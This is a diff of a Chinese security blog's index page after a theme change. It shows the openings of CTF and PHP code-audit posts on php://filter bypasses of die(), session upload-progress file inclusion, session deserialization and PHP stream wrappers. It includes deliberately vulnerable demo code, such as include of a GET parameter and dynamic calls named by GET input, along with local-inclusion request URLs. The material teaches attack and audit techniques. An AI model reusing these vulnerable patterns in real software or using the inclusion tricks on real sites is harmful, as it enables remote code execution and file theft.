-    <div class="article-info article-info-index">
-      
-      
 
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-利用php伪协议绕过die" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/10/31/%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die/" class="article-date">
-      <time datetime="2021-10-31T02:36:35.000Z" itemprop="datePublished">2021-10-31</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/10/31/%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die/">利用php伪协议绕过die()</a>
-    </h1>
-  
-
-
-      </header>
-      
     
-    <div class="article-entry" itemprop="articleBody">
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://antipassion.github.io/2021/10/31/%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Nayon|1163875625@qq.com">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="林中小屋">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
           
-        <p>file_put_content写入文件遇到exit() 、die() 情况分类</p>
+            <a href="/2021/10/31/%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die/" class="post-title-link" itemprop="url">利用php伪协议绕过die()</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-10-31 10:36:35 / 修改时间：11:29:12" itemprop="dateCreated datePublished" datetime="2021-10-31T10:36:35+08:00">2021-10-31</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>file_put_content写入文件遇到exit() 、die() 情况分类</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(<span class="variable">$filename</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$contnet</span>)</span><br><span class="line">file_put_contents(<span class="variable">$content</span>,<span class="string">&quot;&lt;?php die()&quot;</span>.<span class="variable">$contnet</span>);</span><br><span class="line">file_put_contents(<span class="variable">$filename</span>,<span class="variable">$contnet</span>.<span class="string">&#x27;\nxxxxxx&#x27;</span>);</span><br></pre></td></tr></table></figure>
 
 <p>此处我们可以利用php://filter协议，将文件内容中的die或exit解码掉，以便执行后方的其他语句。</p>
@@ -1117,65 +1392,62 @@
 
       
     </div>
-    
-    <div class="article-info article-info-index">
-      
-      
 
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-利用session-upload-progress进行文件包含" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/10/30/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="article-date">
-      <time datetime="2021-10-30T13:08:14.000Z" itemprop="datePublished">2021-10-30</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/10/30/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">利用session.upload_progress进行文件包含</a>
-    </h1>
-  
-
-
-      </header>
-      
     
-    <div class="article-entry" itemprop="articleBody">
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://antipassion.github.io/2021/10/30/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Nayon|1163875625@qq.com">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="林中小屋">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
           
-        <h3 id="Session-上传进度"><a href="#Session-上传进度" class="headerlink" title="Session 上传进度"></a>Session 上传进度</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此特性自PHP <span class="number">5.4</span>.<span class="number">0</span>后启用</span><br></pre></td></tr></table></figure>
+            <a href="/2021/10/30/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="post-title-link" itemprop="url">利用session.upload_progress进行文件包含</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-10-30 21:08:14 / 修改时间：21:41:35" itemprop="dateCreated datePublished" datetime="2021-10-30T21:08:14+08:00">2021-10-30</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="Session-上传进度"><a href="#Session-上传进度" class="headerlink" title="Session 上传进度"></a>Session 上传进度</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此特性自PHP <span class="number">5.4</span>.<span class="number">0</span>后启用</span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.assets/image-20211030211326157.png" alt="image-20211030211326157"></p>
 <p>我们可以利用<code>session.upload_progress</code> 将木马写入session文件，然后包含这个文件。但是首先我们需要知道session文件将会保存在何处</p>
@@ -1205,65 +1477,62 @@
 
       
     </div>
-    
-    <div class="article-info article-info-index">
-      
-      
 
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-php代码审计学习-5" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/10/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5/" class="article-date">
-      <time datetime="2021-10-29T02:32:50.000Z" itemprop="datePublished">2021-10-29</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/10/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5/">php代码审计学习-5</a>
-    </h1>
-  
-
-
-      </header>
-      
     
-    <div class="article-entry" itemprop="articleBody">
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://antipassion.github.io/2021/10/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Nayon|1163875625@qq.com">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="林中小屋">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
           
-        <h3 id="PHP-session反序列化"><a href="#PHP-session反序列化" class="headerlink" title="PHP session反序列化"></a>PHP session反序列化</h3><p>本文转自先知社区的panda师傅所写文章<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6640#toc-1">带你走进PHP session反序列化漏洞</a></p>
+            <a href="/2021/10/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5/" class="post-title-link" itemprop="url">php代码审计学习-5</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-10-29 10:32:50 / 修改时间：19:37:00" itemprop="dateCreated datePublished" datetime="2021-10-29T10:32:50+08:00">2021-10-29</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="PHP-session反序列化"><a href="#PHP-session反序列化" class="headerlink" title="PHP session反序列化"></a>PHP session反序列化</h3><p>本文转自先知社区的panda师傅所写文章<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6640#toc-1">带你走进PHP session反序列化漏洞</a></p>
 <h4 id="PHP-Session的工作流程"><a href="#PHP-Session的工作流程" class="headerlink" title="PHP Session的工作流程"></a>PHP Session的工作流程</h4><p>当开始一个会话时，php会尝试在请求中查找<code>SessionID</code> （通常通过会话cookie），如果发现请求的Cookies，Get、Post中并不存在<code>session id</code>时，php便会自动调用<code>php_session_create_id</code>函数创建一个新的会话，并且通过http response的set-cookie头发送给客户端进行保存。</p>
 <p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029103800930.png" alt="image-20211029103800930"></p>
 <p>当会话开始后，PHP便会将会话中的数据设置到<code>$_SESSION</code>变量中，下为在一个<code>$_SESSION</code>变量中注册变量的例子</p>
@@ -1347,65 +1616,68 @@
 
       
     </div>
-    
-    <div class="article-info article-info-index">
-      
-      
 
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-php代码审计学习-4" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/10/26/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4/" class="article-date">
-      <time datetime="2021-10-26T06:45:24.000Z" itemprop="datePublished">2021-10-26</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/10/26/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4/">php代码审计学习-4</a>
-    </h1>
-  
-
-
-      </header>
-      
     
-    <div class="article-entry" itemprop="articleBody">
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://antipassion.github.io/2021/10/26/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Nayon|1163875625@qq.com">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="林中小屋">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
           
-        <p>​    </p>
+            <a href="/2021/10/26/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4/" class="post-title-link" itemprop="url">php代码审计学习-4</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-10-26 14:45:24" itemprop="dateCreated datePublished" datetime="2021-10-26T14:45:24+08:00">2021-10-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-10-30 20:45:23" itemprop="dateModified" datetime="2021-10-30T20:45:23+08:00">2021-10-30</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>​    </p>
 <h3 id="espcms-审计"><a href="#espcms-审计" class="headerlink" title="espcms 审计"></a>espcms 审计</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">资源下载:http:<span class="comment">//down.chinaz.com/soft/27695.htm</span></span><br></pre></td></tr></table></figure>
 
 <p>解压安装后，利用esay审计系统进行自动化审计，筛选可疑语句。</p>
@@ -1483,65 +1755,62 @@
 
       
     </div>
-    
-    <div class="article-info article-info-index">
-      
-      
 
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-PHP代码审计学习-3" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/10/25/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3/" class="article-date">
-      <time datetime="2021-10-25T04:37:09.000Z" itemprop="datePublished">2021-10-25</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/10/25/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3/">PHP代码审计学习-3</a>
-    </h1>
-  
-
-
-      </header>
-      
     
-    <div class="article-entry" itemprop="articleBody">
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://antipassion.github.io/2021/10/25/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Nayon|1163875625@qq.com">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="林中小屋">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
           
-        <h3 id="动态函数执行和匿名函数执行"><a href="#动态函数执行和匿名函数执行" class="headerlink" title="动态函数执行和匿名函数执行"></a>动态函数执行和匿名函数执行</h3><h4 id="动态函数执行"><a href="#动态函数执行" class="headerlink" title="动态函数执行"></a>动态函数执行</h4><p>函数与函数之间的调用，可能会产生漏洞。</p>
+            <a href="/2021/10/25/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3/" class="post-title-link" itemprop="url">PHP代码审计学习-3</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-10-25 12:37:09 / 修改时间：21:27:27" itemprop="dateCreated datePublished" datetime="2021-10-25T12:37:09+08:00">2021-10-25</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="动态函数执行和匿名函数执行"><a href="#动态函数执行和匿名函数执行" class="headerlink" title="动态函数执行和匿名函数执行"></a>动态函数执行和匿名函数执行</h3><h4 id="动态函数执行"><a href="#动态函数执行" class="headerlink" title="动态函数执行"></a>动态函数执行</h4><p>函数与函数之间的调用，可能会产生漏洞。</p>
 <p>测试demo</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;a&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;b&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"><span class="variable">$args1</span>,<span class="variable">$args2</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$args1</span>(<span class="variable">$args2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">c(<span class="variable">$action</span>,<span class="variable">$cmd</span>);</span><br><span class="line"><span class="comment">//浏览器获取到的值 b ，现在作为 c() 函数的参数插入到了函数中，并且在函数中作为函数名调用了另外一个函数</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -1659,776 +1928,178 @@
 
       
     </div>
-    
-    <div class="article-info article-info-index">
-      
-      
 
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-php代码审计学习-2" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/10/24/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2/" class="article-date">
-      <time datetime="2021-10-24T11:25:29.000Z" itemprop="datePublished">2021-10-24</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
     
     
-      <header class="article-header">
-        
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
   
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/10/24/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2/">php代码审计学习(2)</a>
-    </h1>
+  
   
 
 
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
+  
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+  </nav>
+
+
+
+          </div>
           
-        <h3 id="PHP伪协议学习"><a href="#PHP伪协议学习" class="headerlink" title="PHP伪协议学习"></a>PHP伪协议学习</h3><p>参考自 <a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结</a>、 <a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">php伪协议实现命令执行的七种姿势</a>两篇文章进行复现学习。</p>
-<h4 id="file-协议"><a href="#file-协议" class="headerlink" title="file:// 协议"></a>file:// 协议</h4><ul>
-<li><strong>条件</strong></li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen:off/on </span><br><span class="line">allow_url_include:off/on</span><br><span class="line"><span class="comment">#翻译一下就是file://协议的使用，不受这两个属性的开关的影响</span></span><br></pre></td></tr></table></figure>
 
-<ul>
-<li><strong>作用</strong></li>
-</ul>
-<p>用于访问本地文件系统，在CTF中常用于<strong>读取本地文件</strong>且不受allow_url_fopen与allow_url_include的开关影响</p>
-<p>include()、require()、require_once()、include_once() 参数可控的情况下，如导入非php文件，则仍会按照php的语法进行解析。</p>
-<ul>
-<li>include()、include_once()下：这是由于包含的文件放到了<?php ?>之内，代码执行到包含处依旧被会视为php文件内容，出错只会产生警报，而不会停止运行。</li>
-<li>require()、require_once()下:是由于包含文件与原php文件拼接形成一个新的php文件，之后按照新php文件顺序进行执行。</li>
-</ul>
-<p><strong>说明：</strong></p>
-<p>file:// 文件是PHP使用的默认封装协议，可用于读取本地文件。当指定一个相对路径作为读取目录，其相对时基于当前工作目录的。在很多情况下时脚本所在的目录，除非被修改过。当使用CLI时某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path </code>会可选地搜索，也作为相对的路径。</p>
-<p><strong>用法：</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/path/to/file.ext</span><br><span class="line">relative/path/to/file.ext</span><br><span class="line">fileInCwd.ext</span><br><span class="line">C:/path/to/winfile.ext</span><br><span class="line">C:\path\to\winfile.ext</span><br><span class="line">\\smbserver\share\path\to\winfile.ext</span><br><span class="line">file:<span class="comment">///path/to/file.ext</span></span><br></pre></td></tr></table></figure>
-
-<p>举例展示：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/phplearn/global.php?file=http://127.0.0.1/phplearn/phpinfo.txt</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/phplearn/global.php?file=./phpinfo.txt</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/phplearn/global.php?file=file://D:\phpstudy_pro\WWW\phplearn\phpinfo.txt</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211024195900350.png" alt="image-20211024195900350"></p>
-<h4 id="php-协议"><a href="#php-协议" class="headerlink" title="php:// 协议"></a>php:// 协议</h4><ul>
-<li>条件：</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen: off/on</span><br><span class="line">allow_url_include: 仅当php:<span class="comment">//input、php://memory、php://temp时需要on</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>作用：</li>
-</ul>
-<p><code>php:// </code>访问各个输入/输出流 。我们经常使用到的是<code>php://filter</code> 和<code>php://input</code> 用于<strong>读取源码</strong> ，php://input用于<strong>执行php代码</strong></p>
-<ul>
-<li>说明</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>协议</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>php://input</td>
-<td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</td>
-</tr>
-<tr>
-<td>php://output</td>
-<td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td>
-</tr>
-<tr>
-<td>php://fd</td>
-<td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td>
-</tr>
-<tr>
-<td>php://memory php://temp</td>
-<td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td>
-</tr>
-<tr>
-<td>php://filter</td>
-<td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td>
-</tr>
-</tbody></table>
-<ul>
-<li><strong>php://filter</strong> 参数</li>
-</ul>
-<p>该协议的参数会在该协议上进行传递，多个参数都可以在一个路径下传递，具体参考如下：</p>
-<table>
-<thead>
-<tr>
-<th>php://filter 参数</th>
-<th>描述</th>
-<th></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>resource=&lt;要过滤的数据流&gt;</td>
-<td>必须项。它指定了你要筛选过滤的数据流。</td>
-<td></td>
-</tr>
-<tr>
-<td>read=&lt;读链的过滤器&gt;</td>
-<td>可选项。可以设定一个或多个过滤器名称，以管道符（*\</td>
-<td>*）分隔。</td>
-</tr>
-<tr>
-<td>write=&lt;写链的过滤器&gt;</td>
-<td>可选项。可以设定一个或多个过滤器名称，以管道符（\</td>
-<td>）分隔。</td>
-</tr>
-<tr>
-<td>&lt;; 两个链的过滤器&gt;</td>
-<td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀的筛选器列表会视情况应用于读或写链。</td>
-<td></td>
-</tr>
-</tbody></table>
-<p>其中 read 与 write 处于同级路径上。</p>
-<ul>
-<li>可选的过滤器列表(4类)</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>字符串过滤器</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>string.rot13</td>
-<td>等同于<code>str_rot13()</code>，rot13变换</td>
-</tr>
-<tr>
-<td>string.toupper</td>
-<td>等同于<code>strtoupper()</code>，转大写字母</td>
-</tr>
-<tr>
-<td>string.tolower</td>
-<td>等同于<code>strtolower()</code>，转小写字母</td>
-</tr>
-<tr>
-<td>string.strip_tags</td>
-<td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th>转换过滤器</th>
